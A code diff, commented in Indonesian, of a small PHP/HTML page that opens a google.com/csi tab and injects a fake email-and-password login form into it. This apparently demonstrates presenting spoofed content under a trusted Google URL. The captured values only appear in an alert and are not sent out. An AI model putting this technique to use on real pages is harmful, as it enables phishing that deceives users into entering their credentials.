@@ -1,47 +1,76 @@
-<script>
-function go() {
-    var x = window.open('https://www.google.com/csi');
-    setTimeout(function(){
-        x.document.body.innerHTML = 
-            '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA' +
-            'AAAFCAYAAACNbyblAAAAHElEQVQI12P4/wcAAwAB/9hLS9B4zggwEXhEChcAZgdggp' +
-            'ZmMz3hDi9q8M/y79dyiTj6lwBQ0RVz0Kh0y4gAAAABJRU5ErkJggg==" alt="Hallo Image">' +
-            '<h1>Login</h1>' +
-            'Email:<input id="email"><br>' +
-            'Pass:<input id="pass" type="password"><br>' +
-            'Choose File: <input id="filePicker" type="file" onchange="previewFile()"><br>' +
-            '<img id="previewImage" style="max-width: 100%; max-height: 200px; display: none;"><br>' +
-            '<button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>' +
-            '<br><br>' +
-            '<button onclick="downloadTextFile()">Download Text File</button>'; // Tombol untuk download file
-    }, 3000);
+<?php
+// Cek apakah parameter 'download' ada di URL (misalnya: index.php?download=true)
+if (isset($_GET['download'])) {
+    // Nama file yang akan diunduh
+    $file_name = "halo_aja.txt";
+    
+    // Konten file
+    $file_content = "halo ajaaaa";
+    
+    // Menentukan header untuk pengunduhan file
+    header('Content-Type: text/plain');
+    header('Content-Disposition: attachment; filename="' . $file_name . '"');
+    header('Content-Length: ' . strlen($file_content));
+    
+    // Mengirimkan konten file
+    echo $file_content;
+    exit;
 }
+?>
 
-// Fungsi untuk menampilkan gambar yang diunggah
-function previewFile() {
-    var file = document.getElementById('filePicker').files[0]; // Mendapatkan file yang diunggah
-    var reader = new FileReader();
-    
-    reader.onload = function(e) {
-        var preview = document.getElementById('previewImage');
-        preview.src = e.target.result; // Menyeting src gambar dengan hasil pembacaan file
-        preview.style.display = 'block'; // Menampilkan gambar yang diunggah
-    };
-    
-    if (file) {
-        reader.readAsDataURL(file); // Membaca file sebagai URL data
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Download Example</title>
+</head>
+<body>
+
+    <script>
+    function go() {
+        var x = window.open('https://www.google.com/csi'); // Membuka tab Google/CSI
+        setTimeout(function(){
+            x.document.body.innerHTML = 
+                '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA' +
+                'AAAFCAYAAACNbyblAAAAHElEQVQI12P4/wcAAwAB/9hLS9B4zggwEXhEChcAZgdggp' +
+                'ZmMz3hDi9q8M/y79dyiTj6lwBQ0RVz0Kh0y4gAAAABJRU5ErkJggg==" alt="Hallo Image">' +
+                '<h1>Login</h1>' +
+                'Email:<input id="email"><br>' +
+                'Pass:<input id="pass" type="password"><br>' +
+                'Choose File: <input id="filePicker" type="file" onchange="previewFile()"><br>' +
+                '<img id="previewImage" style="max-width: 100%; max-height: 200px; display: none;"><br>' +
+                '<button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>' +
+                '<br><br>' +
+                '<button onclick="downloadFile()">Download Text File</button>'; // Tombol untuk download file
+        }, 3000);
     }
-}
 
-// Fungsi untuk mendownload file teks
-function downloadTextFile() {
-    var text = "This is an example text file.\nHello, World!"; // Konten file teks
-    var blob = new Blob([text], { type: 'text/plain' }); // Membuat Blob dari teks
-    var link = document.createElement('a'); // Membuat elemen link
-    link.href = URL.createObjectURL(blob); // Membuat URL untuk Blob
-    link.download = 'example.txt'; // Nama file yang diunduh
-    link.click(); // Menyimulasikan klik untuk mengunduh
-}
-</script>
-<button onclick="go()">Go</button>
+    // Fungsi untuk menampilkan gambar yang diunggah
+    function previewFile() {
+        var file = document.getElementById('filePicker').files[0]; // Mendapatkan file yang diunggah
+        var reader = new FileReader();
+
+        reader.onload = function(e) {
+            var preview = document.getElementById('previewImage');
+            preview.src = e.target.result; // Menyeting src gambar dengan hasil pembacaan file
+            preview.style.display = 'block'; // Menampilkan gambar yang diunggah
+        };
+
+        if (file) {
+            reader.readAsDataURL(file); // Membaca file sebagai URL data
+        }
+    }
+
+    // Fungsi untuk mendownload file menggunakan URL yang memanggil PHP (index.php?download=true)
+    function downloadFile() {
+        var downloadTab = window.open('?download=true', '_blank'); // Buka URL pengunduhan di tab baru
+        downloadTab.focus(); // Fokuskan tab baru
+    }
+    </script>
+
+    <button onclick="go()">Go</button>
+
+</body>
+</html>
 
